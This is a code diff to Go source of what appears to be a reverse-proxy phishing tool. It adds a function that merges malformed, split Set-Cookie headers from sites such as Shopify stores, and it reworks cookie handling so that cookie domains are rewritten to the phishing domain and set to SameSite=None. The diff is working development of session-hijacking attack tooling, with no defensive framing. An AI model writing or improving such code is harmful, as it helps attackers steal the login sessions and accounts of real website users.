@@ -1332,8 +1332,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// handle session
-			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
+			var ck *http.Cookie
 			if ps.SessionId != "" {
 				if ps.Created {
 					ck = &http.Cookie{
@@ -1413,10 +1413,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// 保存原始 Set-Cookie 头，用于检测 Partitioned 等 Go 不支持的属性
 			rawCookies := resp.Header.Values("Set-Cookie")
 			resp.Header.Del("Set-Cookie")
-			for _, rawCookie := range rawCookies {
+
+			// 合并分离的 cookie 属性（Shopify 等网站可能返回格式不标准的 Set-Cookie）
+			// 例如：set-cookie: _shopify_y=xxx\nset-cookie: domain=strapya.store\nset-cookie: path=/
+			mergedCookies := p.mergeSplitCookies(rawCookies)
+
+			for _, rawCookie := range mergedCookies {
 				// 调试日志：打印原始 Set-Cookie
 				log.Debug("Original Set-Cookie: %s", rawCookie)
-				
+
 				// 检查原始 Set-Cookie 是否包含 Partitioned 属性（Go 的 http.Cookie 不支持此属性）
 				hasPartitioned := strings.Contains(rawCookie, "; Partitioned")
 
@@ -1435,29 +1440,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							modified = strings.Replace(rawCookie, matches[1]+matches[2], matches[1]+phishDomain, 1)
 						}
 					}
-					// 处理 domain=xxx 作为独立 cookie 的情况（Shopify 等网站可能返回格式不标准的 Set-Cookie）
-					domainOnlyMatch := regexp.MustCompile(`(?i)^(domain=)(.+)$`)
-					if matches := domainOnlyMatch.FindStringSubmatch(strings.TrimSpace(rawCookie)); len(matches) == 3 {
-						origDomain := strings.TrimSpace(matches[2])
-						phishDomain, ok := p.replaceHostWithPhished(origDomain)
-						if ok && phishDomain != origDomain {
-							modified = matches[1] + phishDomain
-						}
-					}
 					log.Debug("Modified Set-Cookie: %s", modified)
 					resp.Header.Add("Set-Cookie", modified)
 					continue
 				}
 
 				for _, ck := range parsedCookies {
-					// 处理 name=domain 的 cookie（Shopify 等网站可能返回格式不标准的 Set-Cookie）
-					if strings.EqualFold(ck.Name, "domain") {
-						phishDomain, ok := p.replaceHostWithPhished(ck.Value)
-						if ok && phishDomain != ck.Value {
-							ck.Value = phishDomain
-						}
-					}
-					
 					// add SameSite=none for every received cookie, allowing cookies through iframes
 					if ck.Secure {
 						ck.SameSite = http.SameSiteNoneMode
@@ -2685,6 +2673,79 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 		}
 	}
 	return hostname, false
+}
+
+// mergeSplitCookies 合并分离的 cookie 属性（Shopify 等网站可能返回格式不标准的 Set-Cookie）
+// 例如：set-cookie: _shopify_y=xxx\nset-cookie: domain=strapya.store\nset-cookie: path=/
+// 需要合并为：_shopify_y=xxx; Domain=strapya.store; Path=/
+func (p *HttpProxy) mergeSplitCookies(rawCookies []string) []string {
+	if len(rawCookies) == 0 {
+		return rawCookies
+	}
+
+	// cookie 属性名称（不区分大小写）
+	cookieAttrs := map[string]bool{
+		"domain":   true,
+		"path":     true,
+		"expires":  true,
+		"max-age":  true,
+		"secure":   true,
+		"httponly": true,
+		"samesite": true,
+		"priority": true,
+	}
+
+	var merged []string
+	var currentCookie string
+
+	for _, raw := range rawCookies {
+		raw = strings.TrimSpace(raw)
+		if raw == "" {
+			continue
+		}
+
+		// 检查是否是 cookie 属性（如 domain=xxx, path=xxx）
+		isAttr := false
+		for attr := range cookieAttrs {
+			// 检查是否是 "attr=value" 格式（没有分号，只有一个等号）
+			if strings.HasPrefix(strings.ToLower(raw), attr+"=") && !strings.Contains(raw, ";") {
+				isAttr = true
+				break
+			}
+			// 检查是否是 "attr" 格式（如 Secure, HttpOnly）
+			if strings.EqualFold(raw, attr) {
+				isAttr = true
+				break
+			}
+		}
+
+		if isAttr && currentCookie != "" {
+			// 这是属性，附加到当前 cookie
+			// 将 domain=xxx 转换为 ; Domain=xxx
+			parts := strings.SplitN(raw, "=", 2)
+			if len(parts) == 2 {
+				attrName := strings.Title(strings.ToLower(parts[0]))
+				currentCookie += "; " + attrName + "=" + parts[1]
+			} else {
+				// Secure, HttpOnly 等没有值的属性
+				attrName := strings.Title(strings.ToLower(raw))
+				currentCookie += "; " + attrName
+			}
+		} else {
+			// 这是一个新的 cookie
+			if currentCookie != "" {
+				merged = append(merged, currentCookie)
+			}
+			currentCookie = raw
+		}
+	}
+
+	// 添加最后一个 cookie
+	if currentCookie != "" {
+		merged = append(merged, currentCookie)
+	}
+
+	return merged
 }
 
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
